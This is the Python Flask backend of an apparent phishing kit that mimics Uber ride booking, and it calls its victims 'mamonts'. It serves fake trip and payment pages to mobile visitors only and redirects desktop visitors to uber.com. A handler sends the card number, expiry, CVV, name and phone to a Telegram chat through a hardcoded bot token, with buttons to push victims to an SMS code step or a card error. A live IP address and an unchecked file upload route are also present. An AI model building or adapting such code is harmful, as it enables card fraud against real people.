from flask import Flask, request, redirect, render_template, send_file, jsonify
from user_agents import parse
import requests
import json
import uuid
import sqlite3
from flask_cors import CORS
import os

#conn = sqlite3.connect("options.db")
#cur = conn.cursor()
#cur.execute("CREATE TABLE options (guid TEXT PRIMARY KEY, price1 REAL, price2 REAL, price3 REAL, price4 REAL, price5 REAL, price6 REAL, price7 REAL, time TEXT, current TEXT);")
#conn.commit()
#cur.close()
#conn.close()

domain = "http://91.222.236.174:8080"
token = "7116232471:AAF3operxvsE_zX5gPRyhAgGLuSI39wgVWU"

app = Flask(__name__, static_folder="static")
CORS(app=app)
mamonts = {}

@app.route("/tg/")
def new_col():
    conn = sqlite3.connect("options.db")
    print("1")
    cur = conn.cursor()
    print("2")
    cur.execute("INSERT INTO options (guid, price1, price2, price3, price4, price5, price6, price7, time, current) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?);", (request.args.get("guid"), float(request.args.get("price1")), float(request.args.get("price2")), float(request.args.get("price3")), float(request.args.get("price4")), float(request.args.get("price5")), float(request.args.get("price6")), float(request.args.get("price7")), request.args.get("time"), request.args.get("current")))
    print("3")
    conn.commit()
    print("4")
    cur.close()
    print("5")
    conn.close()
    print("6")
    return "true"

@app.route("/<guid>")
def new_mamont(guid):
    if guid != "favicon.ico":
        mamonts[guid] = "loading"
    return "true"

@app.route("/img/<guid>")
def get_img(guid):
    return send_file(f"./static/{guid}.png")

@app.route("/options/<guid>")
def get_options(guid):
    conn = sqlite3.connect("options.db")
    cur = conn.cursor()
    cur.execute("SELECT * FROM options WHERE guid = ?", (guid,))
    obj = cur.fetchone()
    print(obj)
    new_obj = []
    for ob in obj:
        new_obj.append(ob)
    return new_obj

@app.route("/state/tg/<guid>/<state>")
def mamonts_state(guid, state):
    mamonts[guid] = state
    return "true"

@app.route("/state/<guid>")
def get_mamont(guid):
    return mamonts[guid]

@app.route('/save_trip', methods=['POST'])
def upload_photo():
    print(request.files)
    photo_file = request.files['photo']
    photo_path = 'static/' + photo_file.filename
    photo_file.save(photo_path)
    return jsonify({'message': f'Photo uploaded successfully: {photo_path}'})

@app.route("/mamont/<guid>")
def state_mamonts():
    return mamonts["test"]

@app.route("/api/")
def client():
    q = request.args
    guid = q["guid"]
    price1 = q["price"]
    return json.dumps({"guid":guid, "price1":price1})

@app.route("/domain/<new_domen>")
def dom(new_domen):
    global domain
    domain = f"http://{new_domen}:8080"
    return "true"

"""@app.route("/")
def index():
    user_agent = request.headers.get('User-Agent')
    ua = parse(user_agent)
    if ua.is_mobile:
        q = request.args
        print(q)
        m01 = q["m01"]
        m11 = q["m11"]
        m02 = q["m02"]
        m22 = q["m22"]
        return render_template("index.html", center=[float(m02), float(m22)], m1=[float(m01), float(m11)],
                               m2=[float(m02), float(m22)], m3=[float(m02), float(m22)])
    else:
        return redirect("https://uber.com/")"""

'''@app.route("/payment")
def pay():
    user_agent = request.headers.get('User-Agent')
    ua = parse(user_agent)
    if ua.is_mobile:
        u = uuid.uuid4()
        u = str(u)
        u = u.replace('-', "")
        mamonts[u] = "test"
        q = request.args
        return render_template("payment.html", guid=u, error="", phone=q["phone"])
    else:
        return redirect("https://uber.com/")

@app.route("/auth")
def auth():
    user_agent = request.headers.get('User-Agent')
    ua = parse(user_agent)
    if ua.is_mobile:
        return render_template("auth.html")
    else:
        return redirect("https://uber.com/")

@app.route("/error_card")
def error_card():
    user_agent = request.headers.get('User-Agent')
    ua = parse(user_agent)
    if ua.is_mobile:
        u = uuid.uuid4()
        u = str(u)
        u = u.replace('-', "")
        mamonts[u] = "test"
        return render_template("payment.html", guid=u, phone="", error="Card error. Check the card")
    else:
        return redirect("https://uber.com/")'''

'''@app.route("/save_trip", methods=["POST"])
def save_trip():
    guid = request.form['guid']
    price_car1 = request.form['price_car1']
    price_car2 = request.form['price_car2']
    price_car3 = request.form['price_car3']
    price_car4 = request.form['price_car4']
    time_trip = request.form['time_trip']
    photo_file = request.files['photo']

    # Сохранение фото
    photo_path = f"static/map_screen_{guid}.jpg"
    photo_file.save(photo_path)

    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()

    cursor.execute("""CREATE TABLE IF NOT EXISTS trips
                      (guid TEXT PRIMARY KEY,
                       photo TEXT,
                       price_car1 INTEGER,
                       price_car2 INTEGER,
                       price_car3 INTEGER,
                       price_car4 INTEGER,
                       time_trip INTEGER)""")

    cursor.execute("""INSERT INTO trips
                      (guid, photo, price_car1, price_car2, price_car3, price_car4, time_trip)
                      VALUES (?, ?, ?, ?, ?, ?, ?)""",
                   (guid, photo_path, price_car1, price_car2, price_car3, price_car4, time_trip))

    conn.commit()
    conn.close()

    return "OK"'''

'''@app.route("/<guid>")
def trip_details(guid):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("""SELECT photo, price_car1, price_car2, price_car3, price_car4, time_trip 
                      FROM trips WHERE guid = ?""", (guid,))
    trip = cursor.fetchone()

    conn.close()

    if trip:
        photo_path, price_car1, price_car2, price_car3, price_car4, time_trip = trip
        return render_template("trip_details.html", photo_path=photo_path, price_car1=price_car1,
                               price_car2=price_car2, price_car3=price_car3, price_car4=price_car4,
                               time_trip=time_trip)
    else:
        return "Trip not found"''''''

@app.route("/photo/<path:filename>")
def photo(filename):
    return send_file(filename, mimetype='image/jpeg')'''
'''@socketio.on("send")
def handle_message(data):
    print(data)
    new_message = f"GUID: {data['guid']}\nNUMBER: {data['number']}\nDD/YY: {data['date']}\nCVV: {data['cvv']}\nNAME: {data['name']}\nPHONE: {data['phone']}"
    inline_keyboard = [
        [
            {
                "text": "SMS",
                "callback_data": f"sms_{data['guid']}"
            },
            {
                "text": "ERROR CARD",
                "callback_data": f"card_{data['guid']}"
            }
        ]
    ]
    reply_markup = json.dumps({"inline_keyboard": inline_keyboard})
    params = {
        "chat_id": -4138396956,
        "text": new_message,
        "reply_markup": reply_markup
    }
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    requests.post(url=url, params=params)
    emit("response", json.dumps(mamonts))'''

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)